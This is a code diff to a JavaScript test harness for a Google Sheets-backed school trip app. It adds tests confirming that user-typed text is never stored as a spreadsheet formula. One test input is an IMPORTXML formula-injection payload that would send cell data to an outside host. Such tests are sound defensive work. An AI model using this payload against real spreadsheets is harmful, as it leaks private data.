@@ -1,7 +1,11 @@
 const vm=require('vm'),fs=require('fs'),crypto=require('crypto');
 const book={};
-function mkSheet(rows){return{rows,getDataRange:()=>({getValues:()=>rows.map(r=>r.slice())}),getLastRow:()=>rows.length,getLastColumn:()=>Math.max(...rows.map(r=>r.length),1),appendRow:(r)=>rows.push(r),
- getRange:(r,c,nr=1,nc=1)=>({setValue:(v)=>{rows[r-1]=rows[r-1]||[];rows[r-1][c-1]=v;},setValues:(vs)=>vs.forEach((row,i)=>{rows[r-1+i]=rows[r-1+i]||[];row.forEach((v,j)=>rows[r-1+i][c-1+j]=v);}),getValues:()=>{const o=[];for(let i=0;i<nr;i++){const row=[];for(let j=0;j<nc;j++)row.push((rows[r-1+i]||[])[c-1+j]??'');o.push(row);}return o;}})};}
+// Behaves like Google Sheets: a leading apostrophe means "plain text" and is not part of the stored value;
+// any other string starting with = + - @ would become a FORMULA, which we record so tests can assert it never happens.
+const FORMULAS=[];
+function cellIn(v){if(typeof v!=='string')return v;if(v[0]==="'")return v.slice(1);if(/^[=+\-@]/.test(v)&&!/^[-+]?\d+(\.\d+)?$/.test(v))FORMULAS.push(v);return v;}
+function mkSheet(rows){return{rows,getDataRange:()=>({getValues:()=>rows.map(r=>r.slice())}),getLastRow:()=>rows.length,getLastColumn:()=>Math.max(...rows.map(r=>r.length),1),appendRow:(r)=>rows.push(r.map(cellIn)),
+ getRange:(r,c,nr=1,nc=1)=>({setValue:(v)=>{rows[r-1]=rows[r-1]||[];rows[r-1][c-1]=cellIn(v);},setValues:(vs)=>vs.forEach((row,i)=>{rows[r-1+i]=rows[r-1+i]||[];row.forEach((v,j)=>rows[r-1+i][c-1+j]=cellIn(v));}),getValues:()=>{const o=[];for(let i=0;i<nr;i++){const row=[];for(let j=0;j<nc;j++)row.push((rows[r-1+i]||[])[c-1+j]??'');o.push(row);}return o;}})};}
 const ss={getSheetByName:n=>book[n]||null,insertSheet:n=>(book[n]=mkSheet([[]]))};
 const props={},cache={};
 const ctx={console,Logger:{log:()=>{}},Date,
@@ -192,6 +196,20 @@ r=post({action:'nutritionAck',token:tn});assert(r.success&&r.ack.current,'nutrit
 r=post({action:'nutritionSummary',token:tl});assert(r.ack&&r.ack.current&&r.ack.by==='تغذية'&&!r.allergies,'leader sees WHO confirmed and when, never the names');
 
 for(const a of ['roster','lookup','printList','leaderSummary','history','custodySummary']){const rr=JSON.stringify(post({action:a,token:T,q:'أحمد',studentId:'1001'}));assert(!rr.includes('ربو')&&!rr.includes('سكري')&&!rr.includes('فول سوداني'),'no medical/allergy data leaks via '+a);}
+// ---- formula injection: every user-typed text is stored as plain text, never as a formula
+{FORMULAS.length=0;const F='=IMPORTXML("http://x/?"&A1,"//a")',tk=post({action:'login',username:'sup1',password:'p1-12345'}).token;
+post({action:'createCase',token:tk,type:'other',text:F,studentId:'@x',clientId:'+cid1'});
+post({action:'scan',token:tk,studentId:'1002',op:'board',method:'-m',notes:F,clientId:'=c2'});post({action:'scan',token:tk,studentId:'1002',op:'undo',clientId:'=c3'});
+post({action:'withdrawStart',token:T,studentId:'2002',guardian:F,reason:F,clientId:'=w9'});post({action:'withdrawCancel',token:T,id:(post({action:'withdrawList',token:T}).open||[]).map(w=>w.id)[0]});
+post({action:'annSave',token:T,title:F,body:F,kind:'announce',audience:'public',clientId:'=a9'});
+post({action:'resSave',token:T,competition:F,team:F,points:1,clientId:'=r9'});
+post({action:'createUser',token:T,username:'inj1',password:'pi-12345',fullName:F,role:'supervisor',permissions:['checkin'],assignedBus:'=1',committees:[]});
+post({action:'updateUserProfile',token:T,targetUsername:'inj1',fullName:F,phone:'+968+1'});
+post({action:'shirtStockSet',token:T,size:'=X',total:1});
+assert(FORMULAS.length===0,'no user text is ever written as a formula ('+FORMULAS.length+' found: '+FORMULAS.slice(0,3).join(' | ')+')');
+const rcase=book.Cases.rows.find(r=>r[5]===F);assert(!!rcase&&rcase[4]==='@x','text is kept exactly as typed (read back without the protective apostrophe)');
+assert(book.Users.rows.some(r=>r.includes(F)),'names with = are stored as text');
+assert(run('cellSafe_(5)')===5&&run('cellSafe_("محمد")')==='محمد'&&run('cellSafe_("-")')==="'-",'numbers and normal text are untouched');}
 // ---- shirts: sizes from registration, stock per size, one shirt per person, undo
 book.Bus.rows[0].push('Shirt size');['M','L','M','xl'].forEach((v,i)=>book.Bus.rows[i+1][book.Bus.rows[0].length-1]=v);
 for(const k of Object.keys(cache))delete cache[k];
